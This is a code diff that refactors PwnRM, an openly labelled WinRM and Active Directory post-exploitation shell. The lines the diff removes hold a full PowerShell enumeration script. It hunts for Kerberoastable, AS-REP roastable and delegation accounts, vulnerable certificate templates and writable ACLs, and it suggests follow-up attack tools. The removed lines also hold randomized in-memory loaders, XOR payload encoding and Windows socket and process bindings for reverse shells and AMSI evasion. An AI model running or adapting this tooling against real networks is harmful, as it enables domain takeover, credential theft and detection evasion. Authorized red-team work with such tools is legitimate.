@@ -1,29 +1,14 @@
-#!/usr/bin/env python3
-# ─────────────────────────────────────────────────────────────────────────────
-#  PwnRM  v1.0.0  —  Advanced WinRM / AD Post-Exploitation Shell
-#  Author : uziii2208  |  https://github.com/uziii2208/PwnRM
-#  License: MIT
-# ─────────────────────────────────────────────────────────────────────────────
-#  Based on the original wmiexec / winrmexec concept.
-#  v1.0.0 adds: rich CLI banner, tab-completion, coloured output, session
-#  metadata, and the new  !adtriage  AD-enumeration module.
-# ─────────────────────────────────────────────────────────────────────────────
+"""
+shell.pwnshell — PwnShell interactive shell
+"""
 
-import os, sys, re, logging, time, shlex, textwrap
-from signal import SIGINT, signal, getsignal
+import os, sys, logging, time, textwrap
 from pathlib import PureWindowsPath, Path
-from argparse import ArgumentParser
 from ipaddress import ip_address
-from base64 import b64encode, b64decode
-from random import randbytes, randint
+from base64 import b64decode
+from random import randbytes
 from datetime import datetime
-
-from impacket import version
-from impacket.examples import logger
-from impacket.examples.utils import parse_target
 from Cryptodome.Hash import MD5
-
-from core import Runspace, create_transport, argument_parser   # core.py
 
 try:
     from prompt_toolkit import prompt, ANSI
@@ -33,401 +18,37 @@ try:
 except ImportError:
     _PTK = False
 
-# ── ANSI palette ─────────────────────────────────────────────────────────────
-R  = "\x1b[31m";  G  = "\x1b[32m";  Y  = "\x1b[33m"
-B  = "\x1b[34m";  M  = "\x1b[35m";  C  = "\x1b[36m"
-W  = "\x1b[37m";  DIM = "\x1b[2m";  BLD = "\x1b[1m"
-RST = "\x1b[0m"
+# ── imports from sibling modules ─────────────────────────────────────────────
+from .ui       import R, G, Y, B, M, C, W, DIM, BLD, RST, c, _BANNER, _COMPLETIONS
+from .ctrlc    import CtrlCHandler
+from .adtriage import get_adtriage_ps
+from .commands import (
+    chunks, b64str, split_args, xorenc, str_b64,
+    _xor_key,
+    new_HostWriter, import_HostWriter,
+    call_XorEnc, import_XorEnc,
+    _importPathFix, _new_PathFix,
+    # dll_import generated variables:
+    _import_LoadLibrary,    _call_LoadLibrary,
+    _import_GetProcAddress, _call_GetProcAddress,
+    _import_VirtualProtect, _call_VirtualProtect,
+    _import_CreateProcess,  _call_CreateProcess,
+    _import_WSAStartup,     _call_WSAStartup,
+    _import_WSASocket,      _call_WSASocket,
+    _import_WSAConnect,     _call_WSAConnect,
+)
 
-def c(col, s):  return f"{col}{s}{RST}"
 
-# ── Banner ────────────────────────────────────────────────────────────────────
-_BANNER = rf"""
-{M}{BLD}
-  ██████╗ ██╗    ██╗███╗   ██╗██████╗ ███╗   ███╗
-  ██╔══██╗██║    ██║████╗  ██║██╔══██╗████╗ ████║
-  ██████╔╝██║ █╗ ██║██╔██╗ ██║██████╔╝██╔████╔██║
-  ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
-  ██║     ╚███╔███╔╝██║ ╚████║██║  ██║██║ ╚═╝ ██║
-  ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
-{RST}{DIM}  Advanced WinRM / AD Post-Exploitation Shell  {BLD}v1.0.0{RST}
-{DIM}  github.com/uziii2208/PwnRM  ·  For authorized engagements only.{RST}
-"""
-
-# ── Tab-completion word list ──────────────────────────────────────────────────
-_COMPLETIONS = [
-    "!download", "!upload", "!amsi", "!psrun", "!netrun",
-    "!revshell", "!log", "!stoplog", "!adtriage", "!sysinfo",
-    "!creds", "!help", "exit", "quit",
-    # common PS one-liners operators may want fast access to:
-    "Get-Process", "Get-Service", "whoami", "ipconfig", "net user",
-    "net localgroup administrators", "systeminfo",
-]
-
-# ── AD Triage PowerShell payloads ─────────────────────────────────────────────
-# Self-contained LDAP/WMI enumeration that runs entirely inside the remote
-# PowerShell session — no extra tools required on the target.
-_ADTRIAGE_PS = r"""
-function Invoke-PwnRMTriage {
-    param([switch]$Quick)
-    $sep = '=' * 72
-    function hdr($t) { Write-Host "`n$sep`n  [*] $t`n$sep" -ForegroundColor Cyan }
-    function ok($m)  { Write-Host "  [+] $m" -ForegroundColor Green }
-    function inf($m) { Write-Host "  [-] $m" }
-    function wrn($m) { Write-Host "  [!] $m" -ForegroundColor Yellow }
-
-    # ── 0. Basic identity ────────────────────────────────────────────────────
-    hdr "Identity & Session"
-    $me = [Security.Principal.WindowsIdentity]::GetCurrent()
-    ok  "User     : $($me.Name)"
-    ok  "SID      : $($me.User)"
-    $groups = $me.Groups | ForEach-Object { try { $_.Translate([Security.Principal.NTAccount]).Value } catch { $_.Value } }
-    ok  "Groups   : $($groups -join ', ')"
-    $privs = whoami /priv 2>$null | Select-String "Se\w+" | ForEach-Object { ($_ -split '\s{2,}')[0].Trim() }
-    ok  "Privs    : $($privs -join ', ')"
-
-    # ── 1. Domain basics ─────────────────────────────────────────────────────
-    hdr "Domain Basics"
-    try {
-        $dom = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-        ok  "Domain   : $($dom.Name)"
-        ok  "Forest   : $($dom.Forest.Name)"
-        $dcs = $dom.DomainControllers | Select -Expand Name
-        ok  "DCs      : $($dcs -join ', ')"
-        $trusts = $dom.GetAllTrustRelationships()
-        if ($trusts) { $trusts | ForEach-Object { wrn "Trust → $($_.TargetName)  [$($_.TrustType) / $($_.TrustDirection)]" } }
-        else { inf "No external trusts found." }
-
-        # ── OS version check → flag Server 2025 (BadSuccessor) ──────────────
-        foreach ($dc in $dom.DomainControllers) {
-            $os = $dc.OSVersion
-            if ($os -match "2025") {
-                wrn "DC $($dc.Name) runs Windows Server 2025 → check BadSuccessor (dMSA)!"
-            } else { inf "DC $($dc.Name) OS: $os" }
-        }
-    } catch { wrn "Could not query domain: $_" }
-
-    if ($Quick) { return }
-
-    # ── 2. High-value groups ──────────────────────────────────────────────────
-    hdr "High-Value Group Members"
-    $hvg = @("Domain Admins","Enterprise Admins","Schema Admins",
-             "Administrators","Account Operators","Backup Operators",
-             "DNSAdmins","Group Policy Creator Owners","Remote Management Users")
-    $root = "LDAP://$(([adsi]'').distinguishedName)"
-    foreach ($g in $hvg) {
-        try {
-            $grp = [adsi]"LDAP://CN=$g,CN=Users,$(([adsi]'').distinguishedName)"
-            if (-not $grp.Path) {
-                # Try common OUs
-                $s = New-Object DirectoryServices.DirectorySearcher([adsi]$root)
-                $s.Filter = "(&(objectCategory=group)(cn=$g))"
-                $grp = $s.FindOne().GetDirectoryEntry()
-            }
-            $members = @($grp.member)
-            if ($members.Count -gt 0) {
-                ok "$g ($($members.Count) member(s)):"
-                $members | ForEach-Object { inf "    $_" }
-            }
-        } catch { }
-    }
-
-    # ── 3. Kerberoastable SPNs ────────────────────────────────────────────────
-    hdr "Kerberoastable Accounts (SPNs on user objects)"
-    $s = New-Object DirectoryServices.DirectorySearcher([adsi]$root)
-    $s.Filter = "(&(objectCategory=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-    $s.PropertiesToLoad.AddRange(@("sAMAccountName","servicePrincipalName","memberOf","adminCount","pwdLastSet"))
-    $s.PageSize = 1000
-    $res = $s.FindAll()
-    if ($res.Count -eq 0) { inf "None found." }
-    $res | ForEach-Object {
-        $sam  = $_.Properties["samaccountname"][0]
-        $spns = $_.Properties["serviceprincipalname"]
-        $adm  = if ($_.Properties["admincount"][0] -eq 1) { " [adminCount=1!]" } else { "" }
-        ok "${sam}${adm}"
-        $spns | ForEach-Object { inf "    SPN: $_" }
-    }
-
-    # ── 4. AS-REP roastable accounts ─────────────────────────────────────────
-    hdr "AS-REP Roastable (DONT_REQ_PREAUTH)"
-    $s.Filter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-    $s.PropertiesToLoad.Clear(); $s.PropertiesToLoad.AddRange(@("sAMAccountName","distinguishedName"))
-    $res = $s.FindAll()
-    if ($res.Count -eq 0) { inf "None found." } else { $res | ForEach-Object { ok $_.Properties["samaccountname"][0] } }
-
-    # ── 5. Unconstrained delegation ───────────────────────────────────────────
-    hdr "Unconstrained Delegation"
-    $s.Filter = "(&(|(objectCategory=computer)(objectCategory=user))(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
-    $s.PropertiesToLoad.Clear(); $s.PropertiesToLoad.AddRange(@("sAMAccountName","objectCategory"))
-    $res = $s.FindAll()
-    if ($res.Count -eq 0) { inf "None found." }
-    $res | ForEach-Object {
-        wrn "$($_.Properties["samaccountname"][0])  ← coerce + capture TGT → DCSync"
-    }
-
-    # ── 6. Constrained delegation (including S4U2Self) ────────────────────────
-    hdr "Constrained Delegation (msDS-AllowedToDelegateTo)"
-    $s.Filter = "(msDS-AllowedToDelegateTo=*)"
-    $s.PropertiesToLoad.Clear(); $s.PropertiesToLoad.AddRange(@("sAMAccountName","msDS-AllowedToDelegateTo","userAccountControl"))
-    $res = $s.FindAll()
-    if ($res.Count -eq 0) { inf "None found." }
-    $res | ForEach-Object {
-        $proto = if (($_.Properties["useraccountcontrol"][0] -band 0x1000000) -ne 0) { "(Protocol-Transition / S4U2Self)" } else { "" }
-        ok "$($_.Properties["samaccountname"][0]) $proto"
-        $_.Properties["msds-allowedtodelegateto"] | ForEach-Object { inf "    → $_" }
-    }
-
-    # ── 7. Resource-Based Constrained Delegation ──────────────────────────────
-    hdr "RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity set)"
-    $s.Filter = "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
-    $s.PropertiesToLoad.Clear(); $s.PropertiesToLoad.AddRange(@("sAMAccountName","distinguishedName"))
-    $res = $s.FindAll()
-    if ($res.Count -eq 0) { inf "None found." }
-    $res | ForEach-Object { wrn "$($_.Properties["samaccountname"][0])  ← RBCD writable" }
-
-    # ── 8. ADCS — Certificate Templates ──────────────────────────────────────
-    hdr "ADCS — Vulnerable Certificate Templates (ESC1/ESC3/ESC4 quick scan)"
-    try {
-        $pki = "CN=Configuration," + ([adsi]'').distinguishedName
-        $s2  = New-Object DirectoryServices.DirectorySearcher([adsi]"LDAP://$pki")
-        $s2.Filter = "(objectClass=pKICertificateTemplate)"
-        $s2.PropertiesToLoad.AddRange(@("cn","msPKI-Certificate-Name-Flag","msPKI-Enrollment-Flag","pKIExtendedKeyUsage","nTSecurityDescriptor"))
-        $s2.PageSize = 500
-        $tpls = $s2.FindAll()
-        $esc_count = 0
-        $tpls | ForEach-Object {
-            $cn    = $_.Properties["cn"][0]
-            $cnf   = [int]$_.Properties["mspki-certificate-name-flag"][0]
-            $enf   = [int]$_.Properties["mspki-enrollment-flag"][0]
-            $ekus  = @($_.Properties["pkiextendedkeyusage"])
-            # ESC1: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x1) + client auth EKU
-            $clientAuth = $ekus -contains "1.3.6.1.5.5.7.3.2"
-            if (($cnf -band 0x1) -and $clientAuth) {
-                wrn "ESC1 candidate : $cn  (enrollee supplies SAN + Client Auth)"
-                $esc_count++
-            }
-            # ESC3: Certificate Request Agent EKU
-            if ($ekus -contains "1.3.6.1.4.1.311.20.2.1") {
-                wrn "ESC3 candidate : $cn  (Certificate Request Agent EKU)"
-                $esc_count++
-            }
-            # ESC4: if WRITE rights for low-priv — need ACL inspection
-            if ($enf -band 0x200) {   # CT_FLAG_PUBLISHED_IN_DS
-                inf "Template $cn is published — check ACLs with Certipy for ESC4/ESC9"
-            }
-        }
-        if ($esc_count -eq 0) { inf "No obvious ESC1/ESC3 templates. Run Certipy for full ADCS audit." }
-    } catch { inf "Could not enumerate ADCS (not joined to PKI or no ADCS role): $_" }
-
-    # ── 9. gMSA / dMSA accounts ───────────────────────────────────────────────
-    hdr "gMSA / dMSA Accounts"
-    $s.Filter = "(objectClass=msDS-GroupManagedServiceAccount)"
-    $s.PropertiesToLoad.Clear(); $s.PropertiesToLoad.AddRange(@("sAMAccountName","msDS-GroupMSAMembership","distinguishedName"))
-    $gmsa = $s.FindAll()
-    if ($gmsa.Count -eq 0) { inf "No gMSA found." }
-    $gmsa | ForEach-Object {
-        ok "gMSA: $($_.Properties["samaccountname"][0])"
-        inf "    DN: $($_.Properties["distinguishedname"][0])"
-    }
-    $s.Filter = "(objectClass=msDS-DelegatedManagedServiceAccount)"
-    $dmsa = $s.FindAll()
-    if ($dmsa.Count -eq 0) { inf "No dMSA found." }
-    $dmsa | ForEach-Object {
-        wrn "dMSA: $($_.Properties["samaccountname"][0]) ← potential BadSuccessor target"
-    }
-
-    # ── 10. ACL quick-wins (WriteDACL / GenericAll / GenericWrite) ────────────
-    hdr "ACL Quick-Wins (DA/EA/DC objects)"
-    # Check if current user has interesting rights on DA/DC objects
-    $targets = @("Domain Admins","Domain Controllers","krbtgt")
-    $me_sam  = ($me.Name -split '\\')[-1]
-    foreach ($t in $targets) {
-        try {
-            $obj  = (New-Object DirectoryServices.DirectorySearcher([adsi]$root,"(sAMAccountName=$t)")).FindOne()
-            if ($obj) {
-                $de   = $obj.GetDirectoryEntry()
-                $acl  = $de.ObjectSecurity.Access
-                $hit  = $acl | Where-Object {
-                    ($_.IdentityReference -match [regex]::Escape($me_sam) -or
-                     $_.IdentityReference -match "Everyone|Authenticated Users") -and
-                    ($_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword")
-                }
-                if ($hit) { $hit | ForEach-Object { wrn "ACL on $t : $($_.IdentityReference) → $($_.ActiveDirectoryRights)" } }
-                else { inf "No obvious writable ACLs on $t for current identity." }
-            }
-        } catch { }
-    }
-
-    # ── 11. Pre-Windows 2000 compatible access ────────────────────────────────
-    hdr "Pre-Windows 2000 Compatible Access"
-    try {
-        $compat = [adsi]"LDAP://CN=Pre-Windows 2000 Compatible Access,CN=Builtin,$($([adsi]'').distinguishedName)"
-        $members = $compat.member
-        if ($members -match "S-1-1-0|S-1-5-7") {
-            wrn "Anonymous / Everyone in 'Pre-Windows 2000 Compatible Access' → anonymous LDAP reads possible!"
-        } else { inf "Group appears restricted." }
-    } catch { }
-
-    # ── 12. Enabled local Administrators check ────────────────────────────────
-    hdr "Local Admin Candidates (enabled, password never expires)"
-    $s.Filter = "(&(objectCategory=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(userAccountControl:1.2.840.113556.1.4.803:=65536)(adminCount=1))"
-    $s.PropertiesToLoad.Clear(); $s.PropertiesToLoad.AddRange(@("sAMAccountName","distinguishedName","pwdLastSet"))
-    $res = $s.FindAll()
-    if ($res.Count -eq 0) { inf "None found." }
-    $res | ForEach-Object {
-        $pls = $_.Properties["pwdlastset"][0]
-        $d   = if ($pls) { [datetime]::FromFileTime($pls).ToString("yyyy-MM-dd") } else { "never" }
-        wrn "$($_.Properties["samaccountname"][0])  ← password never expires, last set: $d"
-    }
-
-    Write-Host "`n$sep" -ForegroundColor Cyan
-    Write-Host "  [*] Triage complete. Next steps:" -ForegroundColor Cyan
-    Write-Host "  [-]  Kerberoast : GetUserSPNs.py / nxc ldap -M kerberoast" -ForegroundColor White
-    Write-Host "  [-]  AS-REP     : GetNPUsers.py / nxc ldap --asreproast" -ForegroundColor White
-    Write-Host "  [-]  ADCS       : certipy find --vulnerable / nxc ldap -M adcs" -ForegroundColor White
-    Write-Host "  [-]  BadSucces. : nxc ldap -M badsuccessor (Server 2025 DCs)" -ForegroundColor White
-    Write-Host "  [-]  BloodHound : bloodhound-python -d DOMAIN -u user -p pass" -ForegroundColor White
-    Write-Host "$sep`n" -ForegroundColor Cyan
-}
-
-Invoke-PwnRMTriage -Quick:$([bool]::Parse('__QUICK__'))
-"""
-
-# ── helpers ───────────────────────────────────────────────────────────────────
-def chunks(xs, n):
-    for off in range(0, len(xs), n):
-        yield xs[off:off+n]
-
-def b64str(s):
-    if isinstance(s, str):
-        return b64encode(s.encode()).decode()
-    return b64encode(s).decode()
-
-def split_args(cmdline):
-    try:
-        args = shlex.split(cmdline, posix=False)
-    except ValueError:
-        return []
-    return [
-        a[1:-1] if (a.startswith('"') and a.endswith('"')) or
-                   (a.startswith("'") and a.endswith("'")) else a
-        for a in args
-    ]
-
-def xorenc(xs, key):
-    return bytes(x ^ key for x in xs)
-
-class CtrlCHandler:
-    def __init__(self, max_interrupts=4, timeout=5):
-        self.max_interrupts = max_interrupts
-        self.timeout        = timeout
-
-    def __enter__(self):
-        self.interrupted      = 0
-        self.released         = False
-        self.original_handler = getsignal(SIGINT)
-
-        def handler(signum, frame):
-            self.interrupted += 1
-            if self.interrupted > 1:
-                n = self.max_interrupts - self.interrupted + 2
-                print()
-                print(c(Y, f"  [!] Ctrl+C spam detected — {n} more will force-terminate."))
-                print(c(DIM, f"      Wait ~{self.timeout}s for the remote session to receive the interrupt."))
-            if self.interrupted > self.max_interrupts:
-                self.release()
-
-        signal(SIGINT, handler)
-        return self
-
-    def __exit__(self, *_):
-        self.release()
-
-    def release(self):
-        if self.released:
-            return False
-        signal(SIGINT, self.original_handler)
-        self.released = True
-        return True
-
-# ── random identifiers used for reflective .NET loading ──────────────────────
-_ns         = "A" + randbytes(randint(3,8)).hex()
-_host_writer= "H" + randbytes(randint(3,8)).hex()
-new_HostWriter   = f"(New-Object {_ns}.{_host_writer} {{ Write-Host -NoNewLine $args }})"
-import_HostWriter = f"""
-Add-Type -TypeDefinition @"
-namespace {_ns} {{
-    public class {_host_writer} : System.IO.TextWriter {{
-        private System.Action<string> _act;
-        public {_host_writer}(System.Action<string> act) {{ _act = act; }}
-        public override void Write(char v)   {{ _act(v.ToString()); }}
-        public override void Write(string v) {{ _act(v); }}
-        public override void WriteLine(string v) {{ _act(v + System.Environment.NewLine); }}
-        public override System.Text.Encoding Encoding {{ get {{ return System.Text.Encoding.UTF8; }} }}
-    }}
-}}
-"@"""
-
-_xor_enc = "X" + randbytes(randint(3,8)).hex()
-_xor_key = randint(1,255)
-call_XorEnc  = f"[{_ns}.{_xor_enc}]::x"
-import_XorEnc = f"""
-Add-Type @"
-namespace {_ns} {{
-    public class {_xor_enc} {{
-        public static byte[] x(byte[] y) {{
-            for(int i = 0; i < y.Length; i++) {{ y[i] ^= {_xor_key}; }}
-            return y;
-        }}
-    }}
-}}
-"@
-"""
-del _xor_enc
-
-_path_fix  = "P" + randbytes(randint(3,8)).hex()
-_new_PathFix = f"(New-Object {_ns}.{_path_fix})"
-_importPathFix = f"""
-Add-Type @"
-namespace {_ns} {{
-    public class {_path_fix} : System.Text.UTF8Encoding {{
-        public override byte[] GetBytes(string s) {{
-            s=s.Replace("\\\\\\\\", "/");
-            return base.GetBytes(s);
-        }}
-    }}
-}}
-"@
-"""
-del _path_fix
-
-def dll_import(ns, lib, fun, sigs):
-    cls  = f"f{randbytes(randint(3,8)).hex()}"
-    name = f"g{randbytes(randint(3,8)).hex()}"
-    ret  = sigs[0]
-    args = ", ".join(f"{ty} x{randbytes(2).hex()}" for ty in sigs[1:])
-    dll  = "+".join(f'"{c_}"' for c_ in lib)
-    entry= "+".join(f'"{c_}"' for c_ in fun)
-    code = f'[DllImport({dll},EntryPoint={entry})] public static extern {ret} {name}({args});'
-    globals()["_call_"   + fun] = f"[{_ns}.{cls}]::{name}"
-    globals()["_import_" + fun] = f"Add-Type -Name {cls} -Namespace {ns} -Member '{code}'"
-
-dll_import(_ns,"kernel32","LoadLibrary",  ["IntPtr","string"])
-dll_import(_ns,"kernel32","GetProcAddress",["IntPtr","IntPtr","string"])
-dll_import(_ns,"kernel32","VirtualProtect",["IntPtr","IntPtr","IntPtr","uint","out uint"])
-dll_import(_ns,"kernel32","CreateProcess", ["IntPtr","IntPtr","string","IntPtr","IntPtr","bool","uint","IntPtr","IntPtr","Int64[]","byte[]"])
-dll_import(_ns,"ws2_32",  "WSAStartup",   ["IntPtr","short","byte[]"])
-dll_import(_ns,"ws2_32",  "WSASocket",    ["IntPtr","uint","uint","uint","IntPtr","uint","uint"])
-dll_import(_ns,"ws2_32",  "WSAConnect",   ["IntPtr","IntPtr","byte[]","int","IntPtr","IntPtr","IntPtr","IntPtr"])
-del _ns
-
-def str_b64(arg):
-    return f"([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64str(arg)}')))"
+# ─────────────────────────────────────────────────────────────────────────────
+#  COPY NGUYÊN VĂN class PwnShell từ pwnrm.py GỐC vào đây
+#  (từ dòng "class PwnShell:" đến hết method "download")
+#  KHÔNG THAY ĐỔI BẤT KỲ LOGIC NÀO BÊN TRONG CLASS
+# ─────────────────────────────────────────────────────────────────────────────
 
 # ── PwnShell ──────────────────────────────────────────────────────────────────
 class PwnShell:
 
-    VERSION = "1.0.0"
+    VERSION = "1.0.1"
 
     def __init__(self, runspace, target_info: dict | None = None):
         self.runspace    = runspace
@@ -614,7 +235,7 @@ class PwnShell:
     #  BUILT-IN COMMANDS
     # ══════════════════════════════════════════════════════════════════════════
 
-    # ── !adtriage (NEW in v1.0.0) ─────────────────────────────────────────────
+    # ── !adtriage (NEW in v1.0.1) ─────────────────────────────────────────────
     def _adtriage_dispatch(self, args):
         quick = "-q" in args.lower() or "--quick" in args.lower()
         self.adtriage(quick=quick)
@@ -629,7 +250,7 @@ class PwnShell:
         and accounts with password-never-expires + adminCount=1.
         """
         self.write_info(c(M+BLD, "  [*] PwnRM AD Triage — loading remote enumeration module..."))
-        ps = _ADTRIAGE_PS.replace("'__QUICK__'", "$true" if quick else "$false")
+        ps = get_adtriage_ps(quick=quick)
         # Inject as a ScriptBlock to stay under AMSI radar
         encoded = b64str(ps.encode("utf-16le"))
         cmd = f"powershell -NonInteractive -EncodedCommand {encoded}"
@@ -912,37 +533,3 @@ Remove-Item Function:Download-Remote
             with open(dst,"wb") as f: f.write(buf[:-32])
         except IOError as e:
             self.write_error(str(e))
-
-# ── entry point ───────────────────────────────────────────────────────────────
-def main():
-    print(_BANNER)
-    args      = argument_parser().parse_args()
-    logger.init(args.ts)
-    logging.getLogger().setLevel(logging.DEBUG if args.debug else logging.INFO)
-    if args.debug:
-        logging.debug(version.getInstallationPath())
-
-    timeout   = int(args.timeout)
-    transport = create_transport(args)
-    tinfo = {
-        "host": getattr(args,"target","?"),
-        "user": getattr(args,"username","?"),
-    }
-
-    with Runspace(transport, timeout) as runspace:
-        shell = PwnShell(runspace, target_info=tinfo)
-        try:
-            if args.X:
-                shell.repl(iter([args.X]))
-            else:
-                shell.help()
-                shell.repl()
-        except EOFError:
-            pass
-        finally:
-            elapsed = str(datetime.now() - shell.start_time).split(".")[0]
-            print(c(DIM, f"\n  [~] Session duration: {elapsed}  |  Commands: {shell.cmd_count}\n"))
-
-
-if __name__ == "__main__":
-    main()
